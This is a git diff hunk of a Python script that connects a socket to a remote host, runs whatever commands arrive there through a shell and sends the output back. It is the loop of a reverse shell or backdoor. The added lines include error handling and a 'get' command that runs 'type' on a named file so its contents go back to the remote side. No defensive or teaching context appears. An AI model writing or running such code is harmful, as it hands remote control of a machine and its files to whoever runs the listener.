@@ -11,14 +11,23 @@ s.connect((host, port))
 
 while True:
     data = s.recv(1024).decode()
-    if data[:2] == "cd":
-        res = data[3:]
-        _res = re.split(r'[\\/]', res)
-        os.chdir((os.getcwd() + "\\" + "\\".join(_res))[:-1])
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        pwd = str(os.getcwd()) + ">>"
-        s.send(cmd.stdout.read())
-        s.send(pwd.encode())
-
+    print(data)
+    try:    
+        if data[:2] == "cd":
+            res = data[3:]
+            _res = re.split(r'[\\/]', res)
+            os.chdir((os.getcwd() + "\\" + "\\".join(_res))[:-1])
+        if data[:3] == "get":
+            mask = "type " + data[4:] + "\n"
+            print(mask)
+            cmd = subprocess.Popen(mask[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            pwd = str(os.getcwd()) + ">>"
+            s.send(cmd.stdout.read())
+            s.send(pwd.encode())
+        elif len(data) > 0:
+            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            pwd = str(os.getcwd()) + ">>"
+            s.send(cmd.stdout.read() + pwd.encode())
+    except:
+        s.send(cmd.stderr.read() + pwd.encode())
 s.close()
